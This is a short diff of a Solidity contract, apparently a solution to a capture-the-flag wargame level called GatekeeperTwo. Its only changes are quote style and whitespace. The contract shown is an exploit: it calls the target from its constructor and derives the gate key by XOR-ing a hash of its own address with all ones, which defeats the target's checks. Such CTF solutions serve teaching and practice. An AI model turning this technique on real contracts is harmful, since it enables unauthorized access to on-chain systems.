@@ -2,7 +2,7 @@
 
 pragma solidity ^0.8.10;
 
-import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';
+import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";
 
 interface IGatekeeperTwo {
     function enter(bytes8 _gateKey) external returns (bool);
@@ -10,6 +10,7 @@ interface IGatekeeperTwo {
 
 contract GatekeeperTwoHack {
     using SafeMath for uint256;
+
     IGatekeeperTwo public challenge;
     uint64 gateKey;
 
@@ -20,7 +21,7 @@ contract GatekeeperTwoHack {
         unchecked {
             gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
         }
-        
+
         challenge.enter(bytes8(gateKey));
     }
 }
